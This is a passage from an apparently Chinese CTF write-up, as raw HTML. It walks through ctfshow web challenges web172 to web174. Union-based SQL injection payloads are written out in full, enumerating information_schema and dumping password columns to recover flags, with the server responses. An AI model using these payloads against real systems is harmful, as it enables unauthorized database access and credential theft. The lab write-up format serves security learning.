punctuation\">;</span></pre></td></tr></table></figure><p>检查了一下发现 url 需要在 /api 下查询</p>\n<p>id=1'order by 1%23</p>\n<p>发现他有反应，到第四列就没了，说明只有三列</p>\n<p>id=1'order by 3%23</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#123;<span class=\"token string\">\"code\"</span>:<span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"msg\"</span>:<span class=\"token string\">\"\\u67e5\\u8be2\\u6210\\u529f\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"count\"</span>:<span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"data\"</span>:<span class=\"token punctuation\">[</span>&#123;<span class=\"token string\">\"id\"</span>:<span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"username\"</span>:<span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"password\"</span>:<span class=\"token string\">\"admin\"</span>&#125;<span class=\"token punctuation\">]</span>&#125;</pre></td></tr></table></figure><p>接下来就是联合查询数据库</p>\n<p>id=1'union select 1,2,3%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;3&quot;&#125;]&#125;\n</code></pre>\n<p>id=1'union select 1,2,database()%23</p>\n<p>现在知道了数据库名</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>接下来</p>\n<p>id=1'union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;information_schema,test,mysql,performance_schema,ctfshow_web&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>接下来查询表</p>\n<p>1'union select 1,(select group_concat(table_name) from information_schema.columns where table_schema='ctfshow_web'),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow_user,ctfshow_user,ctfshow_user,ctfshow_user2,ctfshow_user2,ctfshow_user2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现有个 ctfshow_user、ctfshow_user2 表</p>\n<p>接下来就是爆出字段</p>\n<p>id=1'union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;id,username,password&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现有 id、username、password 三列</p>\n<p>然后就是查看字段内容</p>\n<p>1'union select 1,(select group_concat(password) from ctfshow_user),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,flag_not_here&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现 ctfshow_user 没有 flag，查看 ctfshow_user2</p>\n<p>1'union select 1,(select group_concat(password) from ctfshow_user2),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow&#123;707d21f4-6c7d-409d-9c94-ba6997c6f764&#125;&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现 flag</p>\n<pre><code>ctfshow&#123;707d21f4-6c7d-409d-9c94-ba6997c6f764&#125;\n</code></pre>\n<h2 id=\"web173\"><a class=\"anchor\" href=\"#web173\">#</a> web173</h2>\n<p>考察 sql 基础</p>\n<p>还是熟悉的界面，老规矩还是检查源代码，底部发现 select.js 还是通过 /api/ 查询</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206144532326.png\" alt=\"image-20230206144532326\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'table'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">var</span> table <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  table<span class=\"token operator\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    elem<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'#user'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">id</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'user_table'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ç”¨æˆ·åˆ—è¡¨'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">height</span><span class=\"token punctuation\">:</span> <span class=\"token number\">500</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">page</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">url</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"api/\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">cols</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ID'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">sort</span><span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">fixed</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'left'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ç”¨æˆ·å'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'å¯†ç '</span><span class=\"token punctuation\">,</span><span class=\"token argument-name\">edit</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'text'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  table<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'toolbar(user-filter)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">var</span> checkStatus <span class=\"token operator\">=</span> table<span class=\"token operator\">.</span><span class=\"token function\">checkStatus</span><span class=\"token punctuation\">(</span>obj<span class=\"token operator\">.</span>config<span class=\"token operator\">.</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>obj<span class=\"token operator\">.</span>event<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'add'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'æ·»åŠ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'delete'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'åˆ é™¤'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'update'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'æ›´æ–°'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'element'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">var</span> element <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>element<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  element<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tab(nav)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    console<span class=\"token operator\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'form'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">var</span> form <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>form<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  form<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'submit(*)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">var</span> id <span class=\"token operator\">=</span> data<span class=\"token operator\">.</span>field<span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">var</span> table <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    table<span class=\"token operator\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user_table'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      url<span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'api/?id='</span><span class=\"token operator\">+</span>id</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//é˜»æ­¢è¡¨å•è·³è½¬ã€‚å¦‚æžœéœ€è¦è¡¨å•è·³è½¬ï¼ŒåŽ»æŽ‰è¿™æ®µå³å¯ã€‚</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>最多三列</p>\n<p>id=1'order by 3%23</p>\n<p>id=1'union select 1,2,database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>接着联合查询</p>\n<p>1'union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;information_schema,test,mysql,performance_schema,ctfshow_web&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>接着查询表</p>\n<p>1'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow_user,ctfshow_user2,ctfshow_user3&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现三个表，接着爆字段</p>\n<p>1'union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;id,username,password&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>有 id、username、password 三个字段</p>\n<p>接着爆字段内容</p>\n<p>id=1'union select 1,(select group_concat(password) from ctfshow_user),database()%23</p>\n<p>没找到 flag，下一个表</p>\n<p>id=1'union select 1,(select group_concat(password) from ctfshow_user3),database()%23</p>\n<pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow&#123;e164dc8d-e504-437a-8d4f-167a217b0dbc&#125;&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;\n</code></pre>\n<p>发现 flag</p>\n<pre><code>ctfshow&#123;e164dc8d-e504-437a-8d4f-167a217b0dbc&#125;\n</code></pre>\n<h2 id=\"web174\"><a class=\"anchor\" href=\"#web174\">#</a> web174</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206155210337.png\" alt=\"image-20230206155210337\" /></p>\n<p>老规矩查看源代码找到注入点，底部找到 v4.js，注入点在 api/v4.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'table'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">var</span> table <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  table<span class=\"token operator\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    elem<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'#user'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">id</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'user_table'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ç”¨æˆ·åˆ—è¡¨'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">height</span><span class=\"token punctuation\">:</span> <span class=\"token number\">500</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">page</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">url</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"api/v4.php\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">,</span><span class=\"token argument-name\">cols</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ID'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">sort</span><span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">fixed</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'left'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'ç”¨æˆ·å'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>field<span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">,</span> <span class=\"token argument-name\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'å¯†ç '</span><span class=\"token punctuation\">,</span><span class=\"token argument-name\">edit</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'text'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  table<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'toolbar(user-filter)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">var</span> checkStatus <span class=\"token operator\">=</span> table<span class=\"token operator\">.</span><span class=\"token function\">checkStatus</span><span class=\"token punctuation\">(</span>obj<span class=\"token operator\">.</span>config<span class=\"token operator\">.</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>obj<span class=\"token operator\">.</span>event<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'add'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'æ·»åŠ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'delete'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'åˆ é™¤'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string single-quoted-string\">'update'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      layer<span class=\"token operator\">.</span><span class=\"token function\">msg</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'æ›´æ–°'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'element'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">var</span> element <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>element<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  element<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tab(nav)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    console<span class=\"token operator\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>layui<span class=\"token operator\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'form'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">var</span> form <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>form<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  form<span class=\"token operator\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'submit(*)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">var</span> id <span class=\"token operator\">=</span> data<span class=\"token operator\">.</span>field<span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">var</span> table <span class=\"token operator\">=</span> layui<span class=\"token operator\">.</span>table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    table<span class=\"token operator\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user_table'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      url<span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'api/v4.php?id='</span><span class=\"token operator\">+</span>id</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    